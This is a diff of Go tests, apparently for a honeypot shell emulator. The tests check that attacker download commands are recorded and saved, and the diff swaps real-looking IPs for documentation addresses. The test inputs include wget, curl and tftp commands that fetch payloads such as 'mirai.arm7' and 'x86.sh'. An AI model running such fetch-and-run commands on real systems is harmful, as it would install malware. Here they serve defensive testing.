@@ -10,14 +10,14 @@ func TestWgetRecordsAndDrops(t *testing.T) {
 	var got []Download
 	in.OnDownload = func(_ *Context, d Download) { got = append(got, d) }
 	run(t, in, s, "cd /tmp")
-	out, _, st := run(t, in, s, "wget http://185.246.0.1/bins/x86.sh")
+	out, _, st := run(t, in, s, "wget http://198.51.100.23/bins/x86.sh")
 	if st != 0 {
 		t.Fatalf("wget status %d", st)
 	}
 	if !strings.Contains(out, "200 OK") || !strings.Contains(out, "saved") {
 		t.Errorf("wget output = %q", out)
 	}
-	if len(got) != 1 || got[0].URL != "http://185.246.0.1/bins/x86.sh" || got[0].Tool != "wget" {
+	if len(got) != 1 || got[0].URL != "http://198.51.100.23/bins/x86.sh" || got[0].Tool != "wget" {
 		t.Fatalf("download = %+v", got)
 	}
 	// The payload file exists with the URL's basename and is executable-able.
@@ -60,14 +60,14 @@ func TestCurlPipeAndRecord(t *testing.T) {
 	var got []Download
 	in.OnDownload = func(_ *Context, d Download) { got = append(got, d) }
 	// The classic curl | sh.
-	out, _, _ := run(t, in, s, "curl -s http://192.168.1.1/setup.sh")
+	out, _, _ := run(t, in, s, "curl -s http://198.51.100.7/setup.sh")
 	if len(got) != 1 || got[0].Tool != "curl" {
 		t.Fatalf("curl record = %+v", got)
 	}
 	_ = out
 	// curl -O saves a file.
 	run(t, in, s, "cd /tmp")
-	run(t, in, s, "curl -O http://192.168.1.1/mirai.arm7")
+	run(t, in, s, "curl -O http://198.51.100.7/mirai.arm7")
 	if !s.FS.Exists("/tmp/mirai.arm7") {
 		t.Error("curl -O did not save")
 	}
@@ -83,7 +83,7 @@ func TestTftpFtpget(t *testing.T) {
 	var got []Download
 	in.OnDownload = func(_ *Context, d Download) { got = append(got, d) }
 	run(t, in, s, "cd /tmp")
-	run(t, in, s, "tftp -g -r payload.bin 185.100.87.1")
+	run(t, in, s, "tftp -g -r payload.bin 198.51.100.9")
 	if len(got) != 1 || got[0].Tool != "tftp" || !strings.Contains(got[0].URL, "payload.bin") {
 		t.Fatalf("tftp = %+v", got)
 	}
